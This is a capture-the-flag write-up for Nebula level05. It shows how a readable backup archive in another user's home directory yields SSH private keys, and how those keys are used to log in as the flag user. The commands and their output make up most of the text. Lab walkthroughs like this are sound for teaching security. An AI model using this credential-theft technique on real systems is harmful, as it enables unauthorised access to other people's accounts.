# Level05

## Task

>Check the flag05 home directory. You are looking for weak directory permissions

>To do this level, log in as the level05 account with the password level05. Files for this level can be found in /home/flag05.

## Solution

looking in the directory we see a `.backup` folder with "lax" permissions

```
level05@nebula:/home/flag05$ ls -la
total 5
drwxr-x--- 4 flag05 level05   93 2012-08-18 06:56 .
drwxr-xr-x 1 root   root     200 2012-08-27 07:18 ..
drwxr-xr-x 2 flag05 flag05    42 2011-11-20 20:13 .backup
-rw-r--r-- 1 flag05 flag05   220 2011-05-18 02:54 .bash_logout
-rw-r--r-- 1 flag05 flag05  3353 2011-05-18 02:54 .bashrc
-rw-r--r-- 1 flag05 flag05   675 2011-05-18 02:54 .profile
drwx------ 2 flag05 flag05    70 2011-11-20 20:13 .ssh
```

looking in the `.backup` folder we see a `.tgz` archive

```
level05@nebula:/home/flag05$ ls -la .backup/
total 2
drwxr-xr-x 2 flag05 flag05    42 2011-11-20 20:13 .
drwxr-x--- 4 flag05 level05   93 2012-08-18 06:56 ..
-rw-rw-r-- 1 flag05 flag05  1826 2011-11-20 20:13 backup-19072011.tgz
```

unarchiving it shows an ssh key

```
level05@nebula:/home/flag05/.backup$ cp backup-19072011.tgz ~
level05@nebula:/home/flag05/.backup$ cd
level05@nebula:~$ ls
backup-19072011.tgz
level05@nebula:~$ tar xvzf ./backup-19072011.tgz
.ssh/
.ssh/id_rsa.pub
.ssh/id_rsa
.ssh/authorized_keys
```

using the key to ssh allows us to login as the flag user

```
level05@nebula:~$ ssh flag05@localhost -i .ssh/id_rsa
The authenticity of host 'localhost (127.0.0.1)' can't be established.
ECDSA key fingerprint is ea:8d:09:1d:f1:69:e6:1e:55:c7:ec:e9:76:a1:37:f0.
Are you sure you want to continue connecting (yes/no)? yes
```

```
flag05@nebula:~$ getflag
You have successfully executed getflag on a target account
```
